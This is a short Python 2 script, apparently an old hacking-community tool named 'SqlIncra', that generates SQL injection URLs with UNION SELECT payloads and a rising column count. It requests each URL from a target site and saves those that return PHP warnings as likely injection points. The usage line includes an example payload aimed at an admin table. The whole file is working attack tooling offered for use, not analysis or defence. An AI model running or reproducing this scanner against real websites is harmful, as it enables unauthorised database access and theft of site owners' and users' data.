#!usr/bin/python
#This is a little tool for SQL injection incrementing

#http://darkcode.ath.cx
#d3hydr8[at]gmail[dot]com

import sys, re, urllib2, socket

print "\n\t   d3hydr8[at]gmail[dot]com SqlIncra v1.0"
print "\t--------------------------------------------"

if len(sys.argv) != 5:
	print "\nUsage: ./sqlincra.py <up to incra.> <trailing sql> <how many> <file to save>"
	print "Ex: ./sqlincra.py www.test.com/list.php?pagenum=0&catid=-1%20union%20select%20 %20from%20admin/* 5 <sqlfile.txt>\n"
	sys.exit(1)

sqls = []
socket.setdefaulttimeout(10)

print "[+] Front:",sys.argv[1]
print "[+] Back:",sys.argv[2]
print "[+] Incraments:",sys.argv[3]
print "[+] Saving File:",sys.argv[4]
s = ""
print "[+] Adding Incraments..."
for x in xrange(int(sys.argv[3])):
	 s = s+str(x+1)+","
	 sqls.append(sys.argv[1]+s[:-1]+sys.argv[2])
print "\n[+] SQL's Loaded:",len(sqls)
print "[+] Testing SQL's..."
sql_file = open(sys.argv[4], "a")
for sql in sqls:
	print "\n[-] Testing:",sql
	if sql[:7] != "http://":
		sql = "http://"+sql
	try:
		source = urllib2.urlopen(sql, "80").read()
		if re.search("Warning:", source) != None:
			print "[!] Possible SQL:",sql
			sql_file.writelines(sql+"\n")
		else:
			start = source.find("Warning")
			print "[-] Message:",source[start:start+31].replace("</b>","",1)
	except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error):
		pass
	except(KeyboardInterrupt):
		pass
sql_file.close()
print "\n[-] Done\n"
 	
